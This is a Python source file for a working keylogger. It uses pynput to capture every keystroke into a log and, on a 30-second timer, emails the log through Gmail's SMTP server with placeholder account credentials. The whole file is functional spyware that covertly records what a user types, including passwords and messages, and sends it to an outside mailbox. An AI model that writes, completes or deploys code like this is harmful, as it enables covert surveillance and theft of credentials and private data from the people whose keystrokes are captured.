from pynput import keyboard
from smtplib import SMTP
from threading import Timer

log = ""


def callback_function(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass

    print(log)

def send_email(email,password,message):
    email_server = SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()


def thread_function():
    global log
    send_email("user@gmail.com", "password", log.encode('utf-8'))
    log = ""
    timer_object = Timer(30,thread_function)
    timer_object.start()

keylogger_listener = keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    thread_function()
    keylogger_listener.join()
